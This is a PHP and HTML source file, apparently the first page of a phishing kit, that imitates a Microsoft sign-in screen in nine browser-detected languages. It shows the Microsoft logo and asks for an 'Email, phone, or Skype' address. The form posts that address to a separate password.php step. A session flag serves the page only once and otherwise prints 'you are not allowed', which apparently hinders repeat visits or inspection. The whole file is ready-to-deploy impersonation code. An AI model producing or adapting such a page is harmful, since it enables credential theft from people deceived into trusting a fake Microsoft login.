<?php 
session_start();
if ($_SESSION['authorized'] == "0") {
  $_SESSION['authorized'] = "1";

  // Function to detect browser language
  function detectLanguage() {
      $available_langs = ['fr', 'en', 'es', 'it', 'ja', 'zh', 'pt-br', 'es-mx', 'ro'];
      $default_lang = 'en';
      
      if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
          $browser_langs = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
          
          foreach ($browser_langs as $browser_lang) {
              // Extract primary language (fr, en, etc.)
              $lang = substr($browser_lang, 0, 2);
              $full_lang = strtolower(substr($browser_lang, 0, 5));
              
              // Check for specific variants first
              if ($full_lang == 'pt-br' && in_array('pt-br', $available_langs)) {
                  return 'pt-br';
              } elseif ($full_lang == 'es-mx' && in_array('es-mx', $available_langs)) {
                  return 'es-mx';
              } elseif (in_array($full_lang, $available_langs)) {
                  return $full_lang;
              }
              
              // Then check primary language
              if (in_array($lang, $available_langs)) {
                  return $lang;
              }
              
              // Special cases
              if ($lang == 'pt' && in_array('pt-br', $available_langs)) {
                  return 'pt-br';
              }
              if ($lang == 'es' && in_array('es', $available_langs)) {
                  return 'es';
              }
              if ($lang == 'zh' && in_array('zh', $available_langs)) {
                  return 'zh';
              }
              if ($lang == 'ro' && in_array('ro', $available_langs)) {
                  return 'ro';
              }
          }
      }
      
      return $default_lang;
  }

  $lang = detectLanguage();

  // Full translations array for all languages
  $translations = [
    'fr' => [
      'title' => 'Connexion',
      'signin' => 'Se connecter',
      'email_placeholder' => 'Adresse e-mail, téléphone ou Skype',
      'no_account' => 'Pas de compte ?',
      'create_account' => 'Créez-en un !',
      'cant_access' => 'Vous n\'arrivez pas à accéder à votre compte ?',
      'next' => 'Suivant',
      'options' => '🔑 Options de connexion',
      'terms' => 'Conditions d\'utilisation',
      'privacy' => 'Confidentialité et cookies',
      'email_required' => 'Veuillez saisir une adresse e-mail.',
      'email_invalid' => 'Adresse e-mail invalide.',
    ],
    'en' => [
      'title' => 'Sign In',
      'signin' => 'Sign in',
      'email_placeholder' => 'Email, phone, or Skype',
      'no_account' => 'No account?',
      'create_account' => 'Create one!',
      'cant_access' => 'Can\'t access your account?',
      'next' => 'Next',
      'options' => '🔑 Sign-in options',
      'terms' => 'Terms of use',
      'privacy' => 'Privacy & cookies',
      'email_required' => 'Please enter an email address.',
      'email_invalid' => 'Invalid email address.',
    ],
    'es' => [
      'title' => 'Iniciar sesión',
      'signin' => 'Iniciar sesión',
      'email_placeholder' => 'Correo electrónico, teléfono o Skype',
      'no_account' => '¿No tienes cuenta?',
      'create_account' => '¡Crea una!',
      'cant_access' => '¿No puedes acceder a tu cuenta?',
      'next' => 'Siguiente',
      'options' => '🔑 Opciones de inicio de sesión',
      'terms' => 'Términos de uso',
      'privacy' => 'Privacidad y cookies',
      'email_required' => 'Por favor, ingresa un correo electrónico.',
      'email_invalid' => 'Dirección de correo electrónico no válida.',
    ],
    'es-mx' => [
      'title' => 'Iniciar sesión',
      'signin' => 'Iniciar sesión',
      'email_placeholder' => 'Correo electrónico, teléfono o Skype',
      'no_account' => '¿No tienes cuenta?',
      'create_account' => '¡Crea una!',
      'cant_access' => '¿No puedes acceder a tu cuenta?',
      'next' => 'Siguiente',
      'options' => '🔑 Opciones de inicio de sesión',
      'terms' => 'Términos de uso',
      'privacy' => 'Privacidad y cookies',
      'email_required' => 'Por favor, ingresa un correo electrónico.',
      'email_invalid' => 'Dirección de correo electrónico no válida.',
    ],
    'it' => [
      'title' => 'Accedi',
      'signin' => 'Accedi',
      'email_placeholder' => 'Email, telefono o Skype',
      'no_account' => 'Non hai un account?',
      'create_account' => 'Creane uno!',
      'cant_access' => 'Non riesci ad accedere al tuo account?',
      'next' => 'Avanti',
      'options' => '🔑 Opzioni di accesso',
      'terms' => 'Condizioni d\'uso',
      'privacy' => 'Privacy e cookie',
      'email_required' => 'Inserisci un indirizzo email.',
      'email_invalid' => 'Indirizzo email non valido.',
    ],
    'ja' => [
      'title' => 'サインイン',
      'signin' => 'サインイン',
      'email_placeholder' => 'メールアドレス、電話番号、またはSkype',
      'no_account' => 'アカウントをお持ちでない場合',
      'create_account' => '新規作成',
      'cant_access' => 'アカウントにアクセスできない場合',
      'next' => '次へ',
      'options' => '🔑 サインインオプション',
      'terms' => '利用規約',
      'privacy' => 'プライバシーとCookie',
      'email_required' => 'メールアドレスを入力してください。',
      'email_invalid' => '無効なメールアドレスです。',
    ],
    'zh' => [
      'title' => '登录',
      'signin' => '登录',
      'email_placeholder' => '电子邮件、电话或Skype',
      'no_account' => '没有帐户？',
      'create_account' => '创建一个！',
      'cant_access' => '无法访问您的帐户？',
      'next' => '下一步',
      'options' => '🔑 登录选项',
      'terms' => '使用条款',
      'privacy' => '隐私和 Cookie',
      'email_required' => '请输入电子邮件地址。',
      'email_invalid' => '无效的电子邮件地址。',
    ],
    'pt-br' => [
      'title' => 'Entrar',
      'signin' => 'Entrar',
      'email_placeholder' => 'E-mail, telefone ou Skype',
      'no_account' => 'Não tem uma conta?',
      'create_account' => 'Crie uma!',
      'cant_access' => 'Não consegue acessar sua conta?',
      'next' => 'Avançar',
      'options' => '🔑 Opções de entrada',
      'terms' => 'Termos de uso',
      'privacy' => 'Privacidade e cookies',
      'email_required' => 'Por favor, insira um endereço de e-mail.',
      'email_invalid' => 'Endereço de e-mail inválido.',
    ],
    'ro' => [
      'title' => 'Autentificare',
      'signin' => 'Conectați-vă',
      'email_placeholder' => 'Adresă de e-mail, telefon sau Skype',
      'no_account' => 'Nu aveți un cont?',
      'create_account' => 'Creați unul!',
      'cant_access' => 'Nu puteți accesa contul?',
      'next' => 'Următorul',
      'options' => '🔑 Opțiuni de conectare',
      'terms' => 'Termeni de utilizare',
      'privacy' => 'Confidențialitate și cookie-uri',
      'email_required' => 'Vă rugăm să introduceți o adresă de e-mail.',
      'email_invalid' => 'Adresă de e-mail invalidă.',
    ]
  ];

  $t = $translations[$lang]; // alias pour simplifier
?>

<!DOCTYPE html>
<html lang="<?= $lang ?>">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title><?= htmlspecialchars($t['title']) ?></title>
  <style>
    :root {
      --primary: #0067b8;
      --bg: linear-gradient(to bottom right, #eaf3e1, #f7fbe7);
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .card {
      background-color: white;
      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
      border-radius: 4px;
      width: 100%;
      max-width: 400px;
      padding: 40px 30px;
      margin: 20px;
    }

    .logo {
      width: 48px;
      height: 48px;
      margin-bottom: 30px;
      box-shadow: 0 0 0 4px white;
    }

    h2 {
      font-size: 1.5em;
      margin: 0 0 20px;
      font-weight: 600;
      text-align: left;
    }

    input[type="email"] {
      width: 100%;
      font-size: 1em;
      padding: 10px 5px;
      border: none;
      border-bottom: 1px solid #666;
      outline: none;
    }

    .error-message {
      color: red;
      font-size: 0.9em;
      margin: 10px 0;
    }

    .links {
      margin: 20px 0;
      font-size: 0.9em;
    }

    .links a {
      color: var(--primary);
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }

    .btn {
      background-color: var(--primary);
      color: white;
      border: none;
      padding: 10px 25px;
      font-size: 1em;
      cursor: pointer;
      float: right;
      border-radius: 3px;
    }

    .options-btn {
      margin-top: 20px;
      background-color: white;
      border: 1px solid #ccc;
      width: 100%;
      max-width: 400px;
      padding: 12px;
      font-size: 1em;
      display: flex;
      align-items: center;
      gap: 10px;
      justify-content: center;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
      cursor: pointer;
      font-weight: 500;
    }

    .footer {
      text-align: center;
      font-size: 0.75em;
      color: #333;
      margin: 20px 0;
    }

    .footer a {
      margin: 0 10px;
      color: #333;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    @media (max-width: 480px) {
      .card {
        padding: 30px 20px;
        margin: 10px;
      }

      .btn {
        width: 100%;
        float: none;
        margin-top: 10px;
      }

      .options-btn {
        flex-direction: column;
      }
    }

    @media (max-width: 768px) {
      .card {
        max-width: 90%;
      }

      .options-btn {
        max-width: 90%;
      }
    }
  </style>
</head>
<body>

  <div class="card">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" />
    <h2><?= htmlspecialchars($t['signin']) ?></h2>

    <form method="POST" action="password.php" onsubmit="return validateEmail();">
      <input type="email" name="email" id="email" placeholder="<?= htmlspecialchars($t['email_placeholder']) ?>" required />
      <div id="error" class="error-message"></div>
      <div class="links">
        <p><?= htmlspecialchars($t['no_account']) ?> <a href="#"><?= htmlspecialchars($t['create_account']) ?></a></p>
        <p><a href="#"><?= htmlspecialchars($t['cant_access']) ?></a></p>
      </div>
      <button type="submit" class="btn"><?= htmlspecialchars($t['next']) ?></button>
    </form>
  </div>

  <button class="options-btn"><?= htmlspecialchars($t['options']) ?></button>

  <div class="footer">
    <a href="#"><?= htmlspecialchars($t['terms']) ?></a>
    <a href="#"><?= htmlspecialchars($t['privacy']) ?></a>
    <a href="#">⋯</a>
  </div>

  <script>
    // Traductions JS depuis PHP
    const msgRequired = <?= json_encode($t['email_required']) ?>;
    const msgInvalid = <?= json_encode($t['email_invalid']) ?>;

    function validateEmail() {
      const email = document.getElementById("email").value.trim();
      const errorBox = document.getElementById("error");
      errorBox.textContent = "";

      if (!email) {
        errorBox.textContent = msgRequired;
        return false;
      }

      const allEmails = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

      if (!allEmails.test(email)) {
        errorBox.textContent = msgInvalid;
        return false;
      }

      return true;
    }
  </script>

</body>
</html>

<?php 
} else {
  die('you are not allowed');
}
?>